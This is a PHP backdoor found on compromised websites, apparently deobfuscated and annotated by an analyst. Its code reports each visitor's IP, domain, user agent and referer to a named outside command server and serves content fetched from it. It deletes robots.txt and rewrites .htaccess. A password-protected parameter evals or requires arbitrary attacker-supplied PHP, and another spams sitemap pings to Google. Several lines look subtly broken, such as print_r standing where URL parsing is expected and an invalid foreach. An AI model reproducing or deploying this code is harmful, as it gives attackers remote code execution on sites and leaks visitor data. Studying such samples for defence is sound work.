<?php
// just used for pulling indexes off for the other strings
$encoded_str = "oA-bNnK7L5_JUtRxIY+WCa93Vk0wM1OeSDdB2j/lsXfqphm*TGvQHrPyc\4zuF6iZg8E";

$preg_replace_callback = "preg_replace_callback";
$stream_socket_client = "stream_socket_client";
$stream_get_meta_data = "stream_get_meta_data";
$stream_set_blocking = "stream_set_blocking";
$is_array = "is_array";
$file_put_contents = "file_put_contents";
$file_get_contents = "file_get_contents";
$http_build_query = "http_build_query";
$function_exists = "function_exists";
$trim = "trim";
$base64_encode = "base64_encode";
$base64_decode = "base64_decode";
$rawurlencode = "rawurlencode";
$rawurldecode = "rawurldecode";
$gzuncompress = "gzuncompress";
$str_replace = "str_replace";
$json_encode = "json_encode";
$file_exists = "file_exists";
$curl_setopt = "curl_setopt";
$array_shift = "array_shift";
$preg_split = "preg_split";
$preg_match = "preg_match";
$curl_error = "curl_error";
$curl_close = "curl_close";
$urlencode = "urlencode";
$urldecode = "urldecode";
$str_split = "str_split";
$print_r = "print_r";
$gzinflate = "gzinflate";
$gzdeflate = "gzdeflate";
$curl_init = "curl_init";
$curl_exec = "curl_exec";
$array_pop = "array_pop";
$var_dump = "var_dump";
$tmpfile = "tmpfile";
$mt_rand = "mt_rand";
$implode = "implode";
$explode = "explode";
$isleep = "isleep";
$unlink = "unlink";
$strpos = "strpos";
$strlen = "strlen";
$hexdec = "hexdec";
$getenv = "getenv";
$fwrite = "fwrite";
$fclose = "fclose";
$fread = "fread";
$fgets = "fgets";
$count = "count";
$chmod = "chmod";
$join = "join";
$feof = "feof";
$md5 = "md5";


$c2_url = "http://3829-ch4-v26.zxckid.com";
function create_data_transmit_request($url, $should_use_sockets = 0, $http_method = 1, $request_obj = NULL, $arr = array(), $victim_domain = "s")
{
    if (!preg_match("/^https*\\:\\/\\//si", $url)) {
        if (isset(${"_GET"}["urlerr"])) {
            $url_error = "[urlerror] invalid url:&nbsp;";
            $url_error .= $url;
            echo $url_error;
            unset($url_error);
            exit();
        }
        return '';
    }
    // 
    $possible_commands_str = "curl_init+curl_setopt+curl_exec|fsockopen|pfsockopen|stream_socket_client|socket_create";
    $calling_function = '';
    $maybe_data_str = '';
    foreach (explode('|', $possible_commands_str) as $c) {
        $does_possible_function_exist = 1;
        if ($should_use_sockets && substr($c, 0, 1) == 'c') {
            continue;
        }
        foreach (explode('+', $c) as $d) {
            if (!function_exists($d)) {
                $does_possible_function_exist = 0;
            }
        }
        unset($d);
        if ($does_possible_function_exist) {
            $calling_function = $c;
            break;
        }
    }
    unset($possible_commands_str, $c);
    if ($calling_function == '') {
        return 0;
    }
    if (substr($calling_function, 0, 1) == 'c') { // calling function starts with c, so it must be a CURL request
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_USERAGENT, $victim_domain);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_TIMEOUT, 100);
        curl_setopt($curl, CURLOPT_FRESH_CONNECT, TRUE);
        if ($http_method == 2) {
            curl_setopt($curl, CURLOPT_POST, 1);
            if (is_array($request_obj)) {
                curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($request_obj));
            }
        }
        $curl_result = curl_exec($curl);
        curl_close($curl);
        if (!$curl_result) {
            if (isset(${"_GET"}["curlerr"])) {
                $curl_error = "[curl error]&nbsp;";
                $curl_error .= curl_error($curl);
                echo $curl_error;
                unset($curl_error);
                exit();
            }
            return 0;
        } else {
            return $curl_result;
        }
    }
    $url_params = print_r($url);
    isset($url_params["host"]) || $url_params["host"] = '';
    isset($url_params["path"]) || $url_params["path"] = '';
    isset($url_params["query"]) || $url_params["query"] = '';
    isset($url_params["port"]) || $url_params["port"] = '';
    $url_path = $url_params["path"] ? $url_params["path"] . ($url_params["query"] ? '?' . $url_params["query"] : '') : '/';
    $url_host = $url_params["host"];
    if ($url_params["scheme"] == 'https') {
        $http_version = '1.1';
        $port = empty($url_params["port"]) ? 443 : $url_params["port"];
        $url_host = "ssl://";
        $url_host .= $url_params["host"];
    } else {
        $http_version = '1.0';
        $port = empty($url_params["port"]) ? 80 : $url_params["port"];
    }
    $host_header = 'Host:';
    $host_header .= $url_host;
    $arr[] = $host_header;
    $arr[] = "Connection:Close";
    $arr[] = "User-Agent:" . $victim_domain;
    $arr[] = "Accept:*/*";
    unset($host_header);
    if ($http_method == 2) {// POST
        if (is_array($request_obj)) {
            $request_obj = http_build_query($request_obj);
        }
        $arr[] = "Content-type:application/x-www-form-urlencoded";
        $arr[] = "Content-Length:" . strlen($request_obj);
        $maybe_data_str = "POST $url_path HTTP/$http_version" . PHP_EOL . join(PHP_EOL, $arr) . PHP_EOL . PHP_EOL . $request_obj;
        unset($request_obj);
    } else { // GET
        $maybe_data_str = "GET $url_path HTTP/$http_version" . PHP_EOL . join(PHP_EOL, $arr) . PHP_EOL . PHP_EOL;
    }
    unset($arr, $url_params, $http_version, $url_path);
    $sock_resource = null;
    if (substr($calling_function, -1) == 'n') { // if the last character of the calling function is n then it's either fsockopen or pfsockopen
        $sock_resource = pfsockopen($url_host, $port, $error_code, $error_message, 30);
    } else {
        if (substr($calling_function, -1) == 't') { // if the last character of the calling function is t then it's stream_socket_client
            $sock_client_address = "tcp://";
            $sock_client_address .= $url_host;
            $sock_client_address .= ':';
            $sock_client_address .= $port;
            $sock_resource = stream_socket_client($sock_client_address, $error_code, $error_message, 30);
            unset($sock_client_address);
        }
    }
    $response = '';
    if ($sock_resource) {
        stream_set_blocking($sock_resource, TRUE);
        is_array($sock_resource, 30);
        fwrite($sock_resource, $maybe_data_str);
        if (!$should_use_sockets) {
            $stream_metadata = stream_get_meta_data($sock_resource);
            if (!$stream_metadata["timed_out"]) {
                while (!feof($sock_resource)) {
                    $sock_resource_get_str = fgets($sock_resource);
                    // %0D%0A = \r\n and %0A = \n
                    if ($sock_resource_get_str && (rawurlencode($sock_resource_get_str) == "%0D%0A" || rawurlencode($sock_resource_get_str) == "%0A")) {
                        break;
                    }
                    unset($sock_resource_get_str);
                }
                while (!feof($sock_resource)) {
                    $sock_resource_read_str = fread($sock_resource, 8192); // 8192 bytes = maybe pgp key?
                    $response .= $sock_resource_read_str;
                    unset($sock_resource_read_str);
                }
            }
            unset($stream_metadata);
        }
        fclose($sock_resource);
    } else {
        if (substr($calling_function, -1) == 'e') { // if the last character of the calling function is e then it's socket_create
            $trimmed_url_host = trim($url_host);
            $sock_resource = socket_create(AF_INET, SOCK_STREAM, 0);
            if (socket_connect($sock_resource, $trimmed_url_host, $port)) {
                if (!$should_use_sockets) {
                    socket_write($sock_resource, $maybe_data_str, strlen($maybe_data_str));
                    while ($sock_read_response = @socket_read($sock_resource, 8192)) {
                        $response .= $sock_read_response;
                        unset($sock_read_response);
                    }
                    $response = explode("\\r\\n\\r\\n", $response);
                    array_shift($response);
                    $response = implode("\\r\\n\\r\\n", $response);
                } else {
                    $rand_val_between_2_and_5 = mt_rand(2, 5); // random value between 2 and 5
                    $i = 0;
                    while ($i < $rand_val_between_2_and_5) {
                        socket_write($sock_resource, $maybe_data_str, strlen($maybe_data_str));
                        $i++;
                        sleep(mt_rand(50000, 100000)); // sleep for 50000-100000 seconds (~14hrs-27hrs)
                    }
                    unset($i, $rand_val_between_2_and_5);
                }
            }
            socket_close($sock_resource);
            unset($trimmed_url_host);
        }
    }
    unset($maybe_data_str, $calling_function, $sock_resource, $port, $url_host);
    if (!$should_use_sockets) {
        $response = @preg_replace_callback('/(?:(?:\\r\\n|\\n)|^)([0-9A-F]+)(?:\\r\\n|\\n){1,2}(.*?)' . '((?:\\r\\n|\\n)(?:[0-9A-F]+(?:\\r\\n|\\n))|$)/si', 'hex_to_decimal', $response);
        return trim(trim($response, "\\xEF\\xBB\\xBF"));
    } else {
        return 1;
    }
}
function hex_to_decimal($matches)
{
    return hexdec($matches[1]) == strlen($matches[2]) ? $matches[2] : $matches[0];
}

function get_ip_address($str_ip_address = '')
{
    if (isset(${"_SERVER"})) {
        if (isset(${"_SERVER"}["HTTP_X_FORWARDED_FOR"])) {
            $str_ip_address = ${"_SERVER"}["HTTP_X_FORWARDED_FOR"];
        } else if (isset(${"_SERVER"}["HTTP_CLIENT_IP"])) {
            $str_ip_address = ${"_SERVER"}["HTTP_CLIENT_IP"];
        } else {
            $str_ip_address = ${"_SERVER"}["REMOTE_ADDR"];
        }
    } else {
        if (getenv('HTTP_X_FORWARDED_FOR')) {
            $str_ip_address = getenv('HTTP_X_FORWARDED_FOR');
        } else if (getenv('HTTP_CLIENT_IP')) {
            $str_ip_address = getenv('HTTP_CLIENT_IP');
        } else {
            $str_ip_address = getenv('REMOTE_ADDR');
        }
    }
    return $str_ip_address;
}
function get_victim_domain($str_incoming = '')
{
    if (isset(${"_SERVER"}["HTTP_HOST"])) {
        return ${"_SERVER"}["HTTP_HOST"];
    } elseif (isset(${"_SERVER"}["SERVER_NAME"])) {
        return ${"_SERVER"}["SERVER_NAME"];
    }
    return $str_incoming;
}

function decode_transmission($transmit_response)
{
    $transmit_response = @gzuncompress(base64_decode($transmit_response));
    $split_response_by_pipe = @preg_split("/\\|/si", $transmit_response, -1, PREG_SPLIT_NO_EMPTY);
    if (!is_array($split_response_by_pipe)) {
        return false;
    }
    if (count($split_response_by_pipe) < 2) {
        return false;
    }
    $transmit_response_array["data"] = array_pop($split_response_by_pipe);
    $transmit_response_array["data"] = base64_decode($transmit_response_array["data"]);
    $transmit_response_array["headers"] = $split_response_by_pipe;
    return $transmit_response_array;
}
function delete_robotstxt_and_overwrite_htaccess($htaccess_filename = '')
{
    $robotstxt_filename = "robots.txt";
    if (file_exists($robotstxt_filename)) {
        @unlink($robotstxt_filename);
    }
    if ($htaccess_filename == '') {
        $htaccess_filename = ".htaccess";
    }
    $malicious_htaccess_str = '<FilesMatch ".(py|exe|php)$">\n Order allow,deny\n Deny from all\n</FilesMatch>\n<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|wp-l0gin.php|wp-theme.php|wp-scripts.php|wp-editor.php)$">\n Order allow,deny\n Allow from all\n</FilesMatch>\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</IfModule>';
    $malicious_htaccess_str = @base64_decode($malicious_htaccess_str);
    if (file_exists($htaccess_filename)) {
        $htaccess_file_contents = file_get_contents($htaccess_filename);
        if ($malicious_htaccess_str == $htaccess_file_contents) {
            return;
        }
    }
    @chmod($htaccess_filename, 0777);
    @file_put_contents($htaccess_filename, $malicious_htaccess_str);
    @chmod($htaccess_filename, 0644);
}
function submit_to_google_index($google_or_incoming_url, $sitemap, $obj)
{
    $ping_url_str = "https://%s/ping?sitemap=%s%s/%s";
    $formatted_ping_url_str = sprintf($ping_url_str, $google_or_incoming_url, $obj["protocol"], $obj["server_domain"], $sitemap);
    $ping_transmit_response = create_data_transmit_request($formatted_ping_url_str);
    if (isset($_REQUEST["st"])) {
        var_dump($formatted_ping_url_str);
        var_dump($ping_transmit_response);
        die();
    }
    $google_str = "google";
    $success_str = "success";
    $failed_str = "failed";
    if (strpos($ping_transmit_response, $google_str) != false) {
        die($success_str);
    } else {
        $ping_url_str = "http://%s/ping?sitemap=%s%s/%s";
        $formatted_ping_url_str = sprintf($ping_url_str, $google_or_incoming_url, $obj["protocol"], $obj["server_domain"], $sitemap);
        $ping_transmit_response = create_data_transmit_request($formatted_ping_url_str);
        if (strpos($ping_transmit_response, $google_str) != false) {
            die($success_str);
        }
        die($failed_str);
    }
}
function main($c2_url)
{
    $obj = array();
    $obj["default_params"] = $c2_url;
    $obj["api"] = "http://3829-ch4-v26.zxckid.com";
    $obj["server_domain"] = get_victim_domain();
    $obj["request_url"] = ${"_SERVER"}["REQUEST_URI"];
    $obj["referer"] = isset(${"_SERVER"}["HTTP_REFERER"]) ? ${"_SERVER"}["HTTP_REFERER"] : '';
    $obj["user_agent"] = isset(${"_SERVER"}["HTTP_USER_AGENT"]) ? ${"_SERVER"}["HTTP_USER_AGENT"] : '';
    $obj["ip"] = get_ip_address();
    if (isset(${"_SERVER"}["HTTPS"])) {
        $obj["protocol"] = "https://";
    } else {
        $obj["protocol"] = "http://";
    }
    if (isset(${"_SERVER"}["HTTP_ACCEPT_LANGUAGE"])) {
        $obj["language"] = ${"_SERVER"}["HTTP_ACCEPT_LANGUAGE"];
    } else {
        $obj["language"] = "";
    }
    if (isset($_REQUEST["params"])) {
        header("Content-type:application/json");
        if (function_exists('json_encode')) {
            echo json_encode($obj);
        } else {
            print_r($obj);
        }
        die();
    }
    if (isset($_REQUEST["d_time"])) {
        die('2022/12/1');
    }
    if (isset($_REQUEST["pwd163"])) {
        // first password is for taking a payload in param zzz, builds
        // it, and if param e is set, executes it, if no e param is present
        //then it saves it to a tmp file
        if (md5(trim($_REQUEST["pwd163"])) == "226560a743d22857adddeb10aa38d571") {
            $malicious_payload_str = base64_decode(rawurldecode((urlencode(urldecode($_REQUEST["zzz"])))));
            if (strpos($malicious_payload_str, "<?php") === false) {
                $malicious_payload_str = "<?php" . PHP_EOL . $malicious_payload_str;
            }
            if (isset($_REQUEST["e"])) {
                $malicious_payload_str = str_replace("<?php", "", $malicious_payload_str);
                eval($malicious_payload_str);
                die();
            }
            $tmp_file = tmpfile();
            fwrite($tmp_file, $malicious_payload_str);
            $tmp_file_metadata = stream_get_meta_data($tmp_file);
            @require($tmp_file_metadata["uri"]);
            fclose($tmp_file);
            die();
        }
        // second password expects a sitemap and domain to be passed in and then it will submit
        // the website to google for indexing
        if (md5($_REQUEST["pwd163"] . "a!#_11AA") == "2f7a76f71ff9e24be7c0015ff9cb81d8") {
            if (isset(${"_GET"}["sitemap"])) {
                $sitemap = ${"_GET"}["sitemap"];
                $google_or_incoming_url = "www.google.com";
                if (isset(${"_GET"}["google_or_incoming_url"])) {
                    $google_or_incoming_url = ${"_GET"}["google_or_incoming_url"];
                }
                submit_to_google_index($google_or_incoming_url, $sitemap, $obj);
            }
        }
    }
    // delete robots and overwrite htaccess
    delete_robotstxt_and_overwrite_htaccess();
    $request_obj = array('domain' => $obj["server_domain"], 'request_url' => $obj["request_url"], 'ip' => $obj["ip"], 'agent' => $obj["user_agent"], 'referer' => $obj["referer"], 'protocol' => $obj["protocol"], 'language' => $obj["language"]);
    $transmit_response = create_data_transmit_request($obj["api"], 0, 2, $request_obj, array(), $obj["server_domain"]);
    if (isset($_REQUEST["dump"])) { // probably for debugging
        var_dump($transmit_response);
        $transmit_response = create_data_transmit_request("http://google.co.jp");
        var_dump($transmit_response);
        die();
    }
    // decode the transmission response and echo it out
    $decoded_transmission = decode_transmission($transmit_response);
    if ($decoded_transmission !== false) {
        foreach ($decoded_transmission["headers"] as "Content-type:application/json") {
            @header("Content-type:application/json");
        }
        echo $decoded_transmission["data"];
        die();
    }
}
main($c2_url);
?>